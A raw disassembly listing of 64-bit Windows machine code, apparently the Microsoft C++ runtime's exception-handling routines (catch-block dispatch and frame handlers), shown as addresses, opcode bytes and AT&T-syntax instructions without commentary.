   14000b1ee:	41 b4 01             	mov    $0x1,%r12b
   14000b1f1:	ff c7                	inc    %edi
   14000b1f3:	3b 3e                	cmp    (%rsi),%edi
   14000b1f5:	7c 88                	jl     0x14000b17f
   14000b1f7:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000b1fc:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000b201:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000b206:	41 8a c4             	mov    %r12b,%al
   14000b209:	48 83 c4 20          	add    $0x20,%rsp
   14000b20d:	41 5f                	pop    %r15
   14000b20f:	41 5e                	pop    %r14
   14000b211:	41 5d                	pop    %r13
   14000b213:	41 5c                	pop    %r12
   14000b215:	5f                   	pop    %rdi
   14000b216:	c3                   	ret
   14000b217:	cc                   	int3
   14000b218:	40 53                	rex push %rbx
   14000b21a:	57                   	push   %rdi
   14000b21b:	41 54                	push   %r12
   14000b21d:	41 55                	push   %r13
   14000b21f:	41 56                	push   %r14
   14000b221:	41 57                	push   %r15
   14000b223:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000b22a:	48 8b f9             	mov    %rcx,%rdi
   14000b22d:	45 33 f6             	xor    %r14d,%r14d
   14000b230:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   14000b235:	44 21 b4 24 d0 00 00 	and    %r14d,0xd0(%rsp)
   14000b23c:	00 
   14000b23d:	4c 21 74 24 48       	and    %r14,0x48(%rsp)
   14000b242:	4c 21 74 24 40       	and    %r14,0x40(%rsp)
   14000b247:	e8 c4 83 ff ff       	call   0x140003610
   14000b24c:	48 8b 80 f8 00 00 00 	mov    0xf8(%rax),%rax
   14000b253:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   14000b25a:	00 
   14000b25b:	e8 b0 83 ff ff       	call   0x140003610
   14000b260:	48 8b 80 f0 00 00 00 	mov    0xf0(%rax),%rax
   14000b267:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   14000b26e:	00 
   14000b26f:	4c 8b 67 50          	mov    0x50(%rdi),%r12
   14000b273:	4c 89 a4 24 d8 00 00 	mov    %r12,0xd8(%rsp)
   14000b27a:	00 
   14000b27b:	48 8b 47 48          	mov    0x48(%rdi),%rax
   14000b27f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000b284:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   14000b288:	48 8b 47 30          	mov    0x30(%rdi),%rax
   14000b28c:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000b291:	4c 8b 6f 28          	mov    0x28(%rdi),%r13
   14000b295:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   14000b29a:	e8 71 83 ff ff       	call   0x140003610
   14000b29f:	4c 89 a0 f0 00 00 00 	mov    %r12,0xf0(%rax)
   14000b2a6:	e8 65 83 ff ff       	call   0x140003610
   14000b2ab:	48 89 98 f8 00 00 00 	mov    %rbx,0xf8(%rax)
   14000b2b2:	e8 59 83 ff ff       	call   0x140003610
   14000b2b7:	48 8b 90 f0 00 00 00 	mov    0xf0(%rax),%rdx
   14000b2be:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   14000b2c2:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   14000b2c7:	e8 d0 f7 ff ff       	call   0x14000aa9c
   14000b2cc:	4c 8b f8             	mov    %rax,%r15
   14000b2cf:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000b2d4:	4c 39 77 58          	cmp    %r14,0x58(%rdi)
   14000b2d8:	74 28                	je     0x14000b302
   14000b2da:	c7 84 24 d0 00 00 00 	movl   $0x1,0xd0(%rsp)
   14000b2e1:	01 00 00 00 
   14000b2e5:	e8 26 83 ff ff       	call   0x140003610
   14000b2ea:	48 8b 98 38 01 00 00 	mov    0x138(%rax),%rbx
   14000b2f1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000b2f6:	e8 15 83 ff ff       	call   0x140003610
   14000b2fb:	48 89 98 f0 00 00 00 	mov    %rbx,0xf0(%rax)
   14000b302:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   14000b308:	49 8b d5             	mov    %r13,%rdx
   14000b30b:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000b310:	e8 eb 0f 00 00       	call   0x14000c300
   14000b315:	48 8b d8             	mov    %rax,%rbx
   14000b318:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000b31d:	48 8b bc 24 e8 00 00 	mov    0xe8(%rsp),%rdi
   14000b324:	00 
   14000b325:	e9 89 00 00 00       	jmp    0x14000b3b3
   14000b32a:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   14000b331:	00 
   14000b332:	e8 d9 82 ff ff       	call   0x140003610
   14000b337:	83 a0 c0 02 00 00 00 	andl   $0x0,0x2c0(%rax)
   14000b33e:	83 bc 24 d0 00 00 00 	cmpl   $0x0,0xd0(%rsp)
   14000b345:	00 
   14000b346:	74 2e                	je     0x14000b376
   14000b348:	b2 01                	mov    $0x1,%dl
   14000b34a:	4c 8b a4 24 d8 00 00 	mov    0xd8(%rsp),%r12
   14000b351:	00 
   14000b352:	49 8b cc             	mov    %r12,%rcx
   14000b355:	e8 82 fd ff ff       	call   0x14000b0dc
   14000b35a:	4c 8b 5c 24 40       	mov    0x40(%rsp),%r11
   14000b35f:	4d 8d 4b 20          	lea    0x20(%r11),%r9
   14000b363:	45 8b 43 18          	mov    0x18(%r11),%r8d
   14000b367:	41 8b 53 04          	mov    0x4(%r11),%edx
   14000b36b:	41 8b 0b             	mov    (%r11),%ecx
   14000b36e:	ff 15 e4 2d 00 00    	call   *0x2de4(%rip)        # 0x14000e158
   14000b374:	eb 21                	jmp    0x14000b397
   14000b376:	4c 8b a4 24 d8 00 00 	mov    0xd8(%rsp),%r12
   14000b37d:	00 
   14000b37e:	4d 8d 4c 24 20       	lea    0x20(%r12),%r9
   14000b383:	45 8b 44 24 18       	mov    0x18(%r12),%r8d
   14000b388:	41 8b 54 24 04       	mov    0x4(%r12),%edx
   14000b38d:	41 8b 0c 24          	mov    (%r12),%ecx
   14000b391:	ff 15 c1 2d 00 00    	call   *0x2dc1(%rip)        # 0x14000e158
   14000b397:	44 8b 74 24 20       	mov    0x20(%rsp),%r14d
   14000b39c:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000b3a1:	48 8b bc 24 e8 00 00 	mov    0xe8(%rsp),%rdi
   14000b3a8:	00 
   14000b3a9:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   14000b3ae:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   14000b3b3:	49 8b cf             	mov    %r15,%rcx
   14000b3b6:	e8 59 f7 ff ff       	call   0x14000ab14
   14000b3bb:	45 85 f6             	test   %r14d,%r14d
   14000b3be:	75 4d                	jne    0x14000b40d
   14000b3c0:	41 b8 63 73 6d e0    	mov    $0xe06d7363,%r8d
   14000b3c6:	45 39 04 24          	cmp    %r8d,(%r12)
   14000b3ca:	75 41                	jne    0x14000b40d
   14000b3cc:	41 83 7c 24 18 04    	cmpl   $0x4,0x18(%r12)
   14000b3d2:	75 39                	jne    0x14000b40d
   14000b3d4:	41 81 7c 24 20 20 05 	cmpl   $0x19930520,0x20(%r12)
   14000b3db:	93 19 
   14000b3dd:	74 16                	je     0x14000b3f5
   14000b3df:	41 81 7c 24 20 21 05 	cmpl   $0x19930521,0x20(%r12)
   14000b3e6:	93 19 
   14000b3e8:	74 0b                	je     0x14000b3f5
   14000b3ea:	41 81 7c 24 20 22 05 	cmpl   $0x19930522,0x20(%r12)
   14000b3f1:	93 19 
   14000b3f3:	75 18                	jne    0x14000b40d
   14000b3f5:	49 8b 4c 24 28       	mov    0x28(%r12),%rcx
   14000b3fa:	e8 e1 f6 ff ff       	call   0x14000aae0
   14000b3ff:	85 c0                	test   %eax,%eax
   14000b401:	74 0a                	je     0x14000b40d
   14000b403:	b2 01                	mov    $0x1,%dl
   14000b405:	49 8b cc             	mov    %r12,%rcx
   14000b408:	e8 cf fc ff ff       	call   0x14000b0dc
   14000b40d:	e8 fe 81 ff ff       	call   0x140003610
   14000b412:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   14000b419:	00 
   14000b41a:	48 89 88 f0 00 00 00 	mov    %rcx,0xf0(%rax)
   14000b421:	e8 ea 81 ff ff       	call   0x140003610
   14000b426:	48 89 b8 f8 00 00 00 	mov    %rdi,0xf8(%rax)
   14000b42d:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000b432:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   14000b436:	49 8b 45 00          	mov    0x0(%r13),%rax
   14000b43a:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   14000b441:	ff 
   14000b442:	48 8b c3             	mov    %rbx,%rax
   14000b445:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   14000b44c:	41 5f                	pop    %r15
   14000b44e:	41 5e                	pop    %r14
   14000b450:	41 5d                	pop    %r13
   14000b452:	41 5c                	pop    %r12
   14000b454:	5f                   	pop    %rdi
   14000b455:	5b                   	pop    %rbx
   14000b456:	c3                   	ret
   14000b457:	cc                   	int3
   14000b458:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b45d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b462:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000b467:	41 54                	push   %r12
   14000b469:	41 55                	push   %r13
   14000b46b:	41 56                	push   %r14
   14000b46d:	48 83 ec 30          	sub    $0x30,%rsp
   14000b471:	49 8b f1             	mov    %r9,%rsi
   14000b474:	49 8b f8             	mov    %r8,%rdi
   14000b477:	4c 8b e2             	mov    %rdx,%r12
   14000b47a:	4c 8b f1             	mov    %rcx,%r14
   14000b47d:	33 db                	xor    %ebx,%ebx
   14000b47f:	45 8b 68 04          	mov    0x4(%r8),%r13d
   14000b483:	44 3b eb             	cmp    %ebx,%r13d
   14000b486:	74 0f                	je     0x14000b497
   14000b488:	4d 63 ed             	movslq %r13d,%r13
   14000b48b:	e8 50 f2 ff ff       	call   0x14000a6e0
   14000b490:	4d 8d 5c 05 00       	lea    0x0(%r13,%rax,1),%r11
   14000b495:	eb 03                	jmp    0x14000b49a
   14000b497:	4c 8b db             	mov    %rbx,%r11
   14000b49a:	4c 3b db             	cmp    %rbx,%r11
   14000b49d:	0f 84 bf 01 00 00    	je     0x14000b662
   14000b4a3:	44 3b eb             	cmp    %ebx,%r13d
   14000b4a6:	74 11                	je     0x14000b4b9
   14000b4a8:	e8 33 f2 ff ff       	call   0x14000a6e0
   14000b4ad:	4c 8b d8             	mov    %rax,%r11
   14000b4b0:	48 63 47 04          	movslq 0x4(%rdi),%rax
   14000b4b4:	4c 03 d8             	add    %rax,%r11
   14000b4b7:	eb 03                	jmp    0x14000b4bc
   14000b4b9:	4c 8b db             	mov    %rbx,%r11
   14000b4bc:	41 38 5b 10          	cmp    %bl,0x10(%r11)
   14000b4c0:	0f 84 9c 01 00 00    	je     0x14000b662
   14000b4c6:	39 5f 08             	cmp    %ebx,0x8(%rdi)
   14000b4c9:	75 0a                	jne    0x14000b4d5
   14000b4cb:	0f ba 27 1f          	btl    $0x1f,(%rdi)
   14000b4cf:	0f 83 8d 01 00 00    	jae    0x14000b662
   14000b4d5:	0f ba 27 1f          	btl    $0x1f,(%rdi)
   14000b4d9:	72 0b                	jb     0x14000b4e6
   14000b4db:	48 63 47 08          	movslq 0x8(%rdi),%rax
   14000b4df:	49 03 04 24          	add    (%r12),%rax
   14000b4e3:	4c 8b e0             	mov    %rax,%r12
   14000b4e6:	f6 07 08             	testb  $0x8,(%rdi)
   14000b4e9:	74 46                	je     0x14000b531
   14000b4eb:	bf 01 00 00 00       	mov    $0x1,%edi
   14000b4f0:	8b d7                	mov    %edi,%edx
   14000b4f2:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   14000b4f6:	e8 ed 0c 00 00       	call   0x14000c1e8
   14000b4fb:	3b c3                	cmp    %ebx,%eax
   14000b4fd:	74 28                	je     0x14000b527
   14000b4ff:	8b d7                	mov    %edi,%edx
   14000b501:	49 8b cc             	mov    %r12,%rcx
   14000b504:	e8 df 0c 00 00       	call   0x14000c1e8
   14000b509:	3b c3                	cmp    %ebx,%eax
   14000b50b:	74 1a                	je     0x14000b527
   14000b50d:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   14000b511:	49 89 0c 24          	mov    %rcx,(%r12)
   14000b515:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   14000b519:	e8 02 fc ff ff       	call   0x14000b120
   14000b51e:	49 89 04 24          	mov    %rax,(%r12)
   14000b522:	e9 31 01 00 00       	jmp    0x14000b658
   14000b527:	e8 c0 8a ff ff       	call   0x140003fec
   14000b52c:	e9 27 01 00 00       	jmp    0x14000b658
   14000b531:	bf 01 00 00 00       	mov    $0x1,%edi
   14000b536:	40 84 3e             	test   %dil,(%rsi)
   14000b539:	74 61                	je     0x14000b59c
   14000b53b:	8b d7                	mov    %edi,%edx
   14000b53d:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   14000b541:	e8 a2 0c 00 00       	call   0x14000c1e8
   14000b546:	3b c3                	cmp    %ebx,%eax
   14000b548:	74 48                	je     0x14000b592
   14000b54a:	8b d7                	mov    %edi,%edx
   14000b54c:	49 8b cc             	mov    %r12,%rcx
   14000b54f:	e8 94 0c 00 00       	call   0x14000c1e8
   14000b554:	3b c3                	cmp    %ebx,%eax
   14000b556:	74 3a                	je     0x14000b592
   14000b558:	4c 63 46 14          	movslq 0x14(%rsi),%r8
   14000b55c:	49 8b 56 28          	mov    0x28(%r14),%rdx
   14000b560:	49 8b cc             	mov    %r12,%rcx
   14000b563:	e8 08 76 ff ff       	call   0x140002b70
   14000b568:	83 7e 14 08          	cmpl   $0x8,0x14(%rsi)
   14000b56c:	0f 85 e6 00 00 00    	jne    0x14000b658
   14000b572:	49 39 1c 24          	cmp    %rbx,(%r12)
   14000b576:	0f 84 dc 00 00 00    	je     0x14000b658
   14000b57c:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   14000b580:	49 8b 0c 24          	mov    (%r12),%rcx
   14000b584:	e8 97 fb ff ff       	call   0x14000b120
   14000b589:	49 89 04 24          	mov    %rax,(%r12)
   14000b58d:	e9 c6 00 00 00       	jmp    0x14000b658
   14000b592:	e8 55 8a ff ff       	call   0x140003fec
   14000b597:	e9 bc 00 00 00       	jmp    0x14000b658
   14000b59c:	39 5e 18             	cmp    %ebx,0x18(%rsi)
   14000b59f:	74 11                	je     0x14000b5b2
   14000b5a1:	e8 52 f1 ff ff       	call   0x14000a6f8
   14000b5a6:	4c 8b d8             	mov    %rax,%r11
   14000b5a9:	48 63 46 18          	movslq 0x18(%rsi),%rax
   14000b5ad:	4c 03 d8             	add    %rax,%r11
   14000b5b0:	eb 03                	jmp    0x14000b5b5
   14000b5b2:	4c 8b db             	mov    %rbx,%r11
   14000b5b5:	4c 3b db             	cmp    %rbx,%r11
   14000b5b8:	75 45                	jne    0x14000b5ff
   14000b5ba:	8b d7                	mov    %edi,%edx
   14000b5bc:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   14000b5c0:	e8 23 0c 00 00       	call   0x14000c1e8
   14000b5c5:	3b c3                	cmp    %ebx,%eax
   14000b5c7:	74 2f                	je     0x14000b5f8
   14000b5c9:	8b d7                	mov    %edi,%edx
   14000b5cb:	49 8b cc             	mov    %r12,%rcx
   14000b5ce:	e8 15 0c 00 00       	call   0x14000c1e8
   14000b5d3:	3b c3                	cmp    %ebx,%eax
   14000b5d5:	74 21                	je     0x14000b5f8
   14000b5d7:	4c 63 56 14          	movslq 0x14(%rsi),%r10
   14000b5db:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   14000b5df:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   14000b5e3:	e8 38 fb ff ff       	call   0x14000b120
   14000b5e8:	48 8b d0             	mov    %rax,%rdx
   14000b5eb:	4d 8b c2             	mov    %r10,%r8
   14000b5ee:	49 8b cc             	mov    %r12,%rcx
   14000b5f1:	e8 7a 75 ff ff       	call   0x140002b70
   14000b5f6:	eb 60                	jmp    0x14000b658
   14000b5f8:	e8 ef 89 ff ff       	call   0x140003fec
   14000b5fd:	eb 59                	jmp    0x14000b658
   14000b5ff:	8b d7                	mov    %edi,%edx
   14000b601:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   14000b605:	e8 de 0b 00 00       	call   0x14000c1e8
   14000b60a:	3b c3                	cmp    %ebx,%eax
   14000b60c:	74 44                	je     0x14000b652
   14000b60e:	8b d7                	mov    %edi,%edx
   14000b610:	49 8b cc             	mov    %r12,%rcx
   14000b613:	e8 d0 0b 00 00       	call   0x14000c1e8
   14000b618:	3b c3                	cmp    %ebx,%eax
   14000b61a:	74 36                	je     0x14000b652
   14000b61c:	39 5e 18             	cmp    %ebx,0x18(%rsi)
   14000b61f:	74 11                	je     0x14000b632
   14000b621:	e8 d2 f0 ff ff       	call   0x14000a6f8
   14000b626:	48 8b c8             	mov    %rax,%rcx
   14000b629:	48 63 46 18          	movslq 0x18(%rsi),%rax
   14000b62d:	48 03 c8             	add    %rax,%rcx
   14000b630:	eb 03                	jmp    0x14000b635
   14000b632:	48 8b cb             	mov    %rbx,%rcx
   14000b635:	e8 ae 0b 00 00       	call   0x14000c1e8
   14000b63a:	3b c3                	cmp    %ebx,%eax
   14000b63c:	74 14                	je     0x14000b652
   14000b63e:	8a 06                	mov    (%rsi),%al
   14000b640:	24 04                	and    $0x4,%al
   14000b642:	f6 d8                	neg    %al
   14000b644:	1b c9                	sbb    %ecx,%ecx
   14000b646:	f7 d9                	neg    %ecx
   14000b648:	03 cf                	add    %edi,%ecx
   14000b64a:	8b d9                	mov    %ecx,%ebx
   14000b64c:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   14000b650:	eb 06                	jmp    0x14000b658
   14000b652:	e8 95 89 ff ff       	call   0x140003fec
   14000b657:	90                   	nop
   14000b658:	8b c3                	mov    %ebx,%eax
   14000b65a:	eb 08                	jmp    0x14000b664
   14000b65c:	e8 67 89 ff ff       	call   0x140003fc8
   14000b661:	90                   	nop
   14000b662:	33 c0                	xor    %eax,%eax
   14000b664:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000b669:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000b66e:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   14000b673:	48 83 c4 30          	add    $0x30,%rsp
   14000b677:	41 5e                	pop    %r14
   14000b679:	41 5d                	pop    %r13
   14000b67b:	41 5c                	pop    %r12
   14000b67d:	c3                   	ret
   14000b67e:	cc                   	int3
   14000b67f:	cc                   	int3
   14000b680:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b685:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b68a:	57                   	push   %rdi
   14000b68b:	48 83 ec 20          	sub    $0x20,%rsp
   14000b68f:	49 8b d9             	mov    %r9,%rbx
   14000b692:	48 8b f1             	mov    %rcx,%rsi
   14000b695:	41 0f ba 20 1f       	btl    $0x1f,(%r8)
   14000b69a:	73 05                	jae    0x14000b6a1
   14000b69c:	48 8b fa             	mov    %rdx,%rdi
   14000b69f:	eb 07                	jmp    0x14000b6a8
   14000b6a1:	49 63 78 08          	movslq 0x8(%r8),%rdi
   14000b6a5:	48 03 3a             	add    (%rdx),%rdi
   14000b6a8:	e8 ab fd ff ff       	call   0x14000b458
   14000b6ad:	83 e8 01             	sub    $0x1,%eax
   14000b6b0:	74 3b                	je     0x14000b6ed
   14000b6b2:	83 f8 01             	cmp    $0x1,%eax
   14000b6b5:	75 61                	jne    0x14000b718
   14000b6b7:	45 33 d2             	xor    %r10d,%r10d
   14000b6ba:	44 39 53 18          	cmp    %r10d,0x18(%rbx)
   14000b6be:	74 0f                	je     0x14000b6cf
   14000b6c0:	e8 33 f0 ff ff       	call   0x14000a6f8
   14000b6c5:	4c 8b d0             	mov    %rax,%r10
   14000b6c8:	48 63 43 18          	movslq 0x18(%rbx),%rax
   14000b6cc:	4c 03 d0             	add    %rax,%r10
   14000b6cf:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000b6d3:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   14000b6d7:	e8 44 fa ff ff       	call   0x14000b120
   14000b6dc:	48 8b d0             	mov    %rax,%rdx
   14000b6df:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b6e5:	48 8b cf             	mov    %rdi,%rcx
   14000b6e8:	41 ff d2             	call   *%r10
   14000b6eb:	eb 2b                	jmp    0x14000b718
   14000b6ed:	45 33 d2             	xor    %r10d,%r10d
   14000b6f0:	44 39 53 18          	cmp    %r10d,0x18(%rbx)
   14000b6f4:	74 0c                	je     0x14000b702
   14000b6f6:	e8 fd ef ff ff       	call   0x14000a6f8
   14000b6fb:	4c 63 53 18          	movslq 0x18(%rbx),%r10
   14000b6ff:	4c 03 d0             	add    %rax,%r10
   14000b702:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000b706:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   14000b70a:	e8 11 fa ff ff       	call   0x14000b120
   14000b70f:	48 8b d0             	mov    %rax,%rdx
   14000b712:	48 8b cf             	mov    %rdi,%rcx
   14000b715:	41 ff d2             	call   *%r10
   14000b718:	eb 06                	jmp    0x14000b720
   14000b71a:	e8 a9 88 ff ff       	call   0x140003fc8
   14000b71f:	90                   	nop
   14000b720:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b725:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000b72a:	48 83 c4 20          	add    $0x20,%rsp
   14000b72e:	5f                   	pop    %rdi
   14000b72f:	c3                   	ret
   14000b730:	48 8b c4             	mov    %rsp,%rax
   14000b733:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000b737:	48 89 68 18          	mov    %rbp,0x18(%rax)
   14000b73b:	56                   	push   %rsi
   14000b73c:	57                   	push   %rdi
   14000b73d:	41 54                	push   %r12
   14000b73f:	41 55                	push   %r13
   14000b741:	41 56                	push   %r14
   14000b743:	48 83 ec 50          	sub    $0x50,%rsp
   14000b747:	4c 8b ac 24 a0 00 00 	mov    0xa0(%rsp),%r13
   14000b74e:	00 
   14000b74f:	49 8b e9             	mov    %r9,%rbp
   14000b752:	4c 8b e2             	mov    %rdx,%r12
   14000b755:	4d 8b f0             	mov    %r8,%r14
   14000b758:	48 8b d9             	mov    %rcx,%rbx
   14000b75b:	4c 8d 48 10          	lea    0x10(%rax),%r9
   14000b75f:	4d 8b c5             	mov    %r13,%r8
   14000b762:	48 8b d5             	mov    %rbp,%rdx
   14000b765:	49 8b cc             	mov    %r12,%rcx
   14000b768:	e8 87 ee ff ff       	call   0x14000a5f4
   14000b76d:	4c 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%r9
   14000b774:	00 
   14000b775:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   14000b77c:	00 
   14000b77d:	48 8b f8             	mov    %rax,%rdi
   14000b780:	4d 85 c9             	test   %r9,%r9
   14000b783:	74 0e                	je     0x14000b793
   14000b785:	4c 8b c6             	mov    %rsi,%r8
   14000b788:	48 8b d0             	mov    %rax,%rdx
   14000b78b:	48 8b cb             	mov    %rbx,%rcx
   14000b78e:	e8 ed fe ff ff       	call   0x14000b680
   14000b793:	e8 48 ef ff ff       	call   0x14000a6e0
   14000b798:	48 63 4e 0c          	movslq 0xc(%rsi),%rcx
   14000b79c:	4c 8b cf             	mov    %rdi,%r9
   14000b79f:	48 03 c1             	add    %rcx,%rax
   14000b7a2:	8a 8c 24 d8 00 00 00 	mov    0xd8(%rsp),%cl
   14000b7a9:	4d 8b c6             	mov    %r14,%r8
   14000b7ac:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   14000b7b0:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   14000b7b7:	00 
   14000b7b8:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   14000b7bd:	8b 11                	mov    (%rcx),%edx
   14000b7bf:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000b7c4:	49 8b cc             	mov    %r12,%rcx
   14000b7c7:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000b7cb:	48 8b d3             	mov    %rbx,%rdx
   14000b7ce:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b7d3:	e8 9c f3 ff ff       	call   0x14000ab74
   14000b7d8:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   14000b7dd:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000b7e1:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000b7e5:	49 8b e3             	mov    %r11,%rsp
   14000b7e8:	41 5e                	pop    %r14
   14000b7ea:	41 5d                	pop    %r13
   14000b7ec:	41 5c                	pop    %r12
   14000b7ee:	5f                   	pop    %rdi
   14000b7ef:	5e                   	pop    %rsi
   14000b7f0:	c3                   	ret
   14000b7f1:	cc                   	int3
   14000b7f2:	cc                   	int3
   14000b7f3:	cc                   	int3
   14000b7f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b7f9:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000b7fe:	55                   	push   %rbp
   14000b7ff:	56                   	push   %rsi
   14000b800:	57                   	push   %rdi
   14000b801:	41 54                	push   %r12
   14000b803:	41 55                	push   %r13
   14000b805:	41 56                	push   %r14
   14000b807:	41 57                	push   %r15
   14000b809:	48 83 ec 70          	sub    $0x70,%rsp
   14000b80d:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   14000b813:	4d 8b e9             	mov    %r9,%r13
   14000b816:	49 8b f8             	mov    %r8,%rdi
   14000b819:	4c 8b f2             	mov    %rdx,%r14
   14000b81c:	48 8b f1             	mov    %rcx,%rsi
   14000b81f:	0f 84 fb 01 00 00    	je     0x14000ba20
   14000b825:	e8 e6 7d ff ff       	call   0x140003610
   14000b82a:	44 8b bc 24 e0 00 00 	mov    0xe0(%rsp),%r15d
   14000b831:	00 
   14000b832:	48 8b ac 24 d0 00 00 	mov    0xd0(%rsp),%rbp
   14000b839:	00 
   14000b83a:	48 83 b8 e0 00 00 00 	cmpq   $0x0,0xe0(%rax)
   14000b841:	00 
   14000b842:	74 4e                	je     0x14000b892
   14000b844:	e8 c7 7d ff ff       	call   0x140003610
   14000b849:	48 8b d8             	mov    %rax,%rbx
   14000b84c:	e8 4b 7c ff ff       	call   0x14000349c
   14000b851:	48 39 83 e0 00 00 00 	cmp    %rax,0xe0(%rbx)
   14000b858:	74 38                	je     0x14000b892
   14000b85a:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   14000b860:	74 30                	je     0x14000b892
   14000b862:	48 8b 84 24 e8 00 00 	mov    0xe8(%rsp),%rax
   14000b869:	00 
   14000b86a:	4d 8b cd             	mov    %r13,%r9
   14000b86d:	4c 8b c7             	mov    %rdi,%r8
   14000b870:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000b875:	49 8b d6             	mov    %r14,%rdx
   14000b878:	48 8b ce             	mov    %rsi,%rcx
   14000b87b:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000b880:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000b885:	e8 96 f0 ff ff       	call   0x14000a920
   14000b88a:	85 c0                	test   %eax,%eax
   14000b88c:	0f 85 8e 01 00 00    	jne    0x14000ba20
   14000b892:	83 7d 0c 00          	cmpl   $0x0,0xc(%rbp)
   14000b896:	75 05                	jne    0x14000b89d
   14000b898:	e8 4f 87 ff ff       	call   0x140003fec
   14000b89d:	44 8b a4 24 d8 00 00 	mov    0xd8(%rsp),%r12d
   14000b8a4:	00 
   14000b8a5:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000b8aa:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000b8af:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000b8b4:	48 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%rax
   14000b8bb:	00 
   14000b8bc:	45 8b c7             	mov    %r15d,%r8d
   14000b8bf:	45 8b cc             	mov    %r12d,%r9d
   14000b8c2:	48 8b d5             	mov    %rbp,%rdx
   14000b8c5:	49 8b ce             	mov    %r14,%rcx
   14000b8c8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b8cd:	e8 a2 f0 ff ff       	call   0x14000a974
   14000b8d2:	48 8b f8             	mov    %rax,%rdi
   14000b8d5:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000b8dc:	e9 35 01 00 00       	jmp    0x14000ba16
   14000b8e1:	44 3b 27             	cmp    (%rdi),%r12d
   14000b8e4:	0f 8c 1f 01 00 00    	jl     0x14000ba09
   14000b8ea:	44 3b 67 04          	cmp    0x4(%rdi),%r12d
   14000b8ee:	0f 8f 15 01 00 00    	jg     0x14000ba09
   14000b8f4:	e8 e7 ed ff ff       	call   0x14000a6e0
   14000b8f9:	48 63 4f 0c          	movslq 0xc(%rdi),%rcx
   14000b8fd:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   14000b901:	48 63 4f 10          	movslq 0x10(%rdi),%rcx
   14000b905:	48 8d 14 91          	lea    (%rcx,%rdx,4),%rdx
   14000b909:	83 7c 10 f0 00       	cmpl   $0x0,-0x10(%rax,%rdx,1)
   14000b90e:	74 24                	je     0x14000b934
   14000b910:	e8 cb ed ff ff       	call   0x14000a6e0
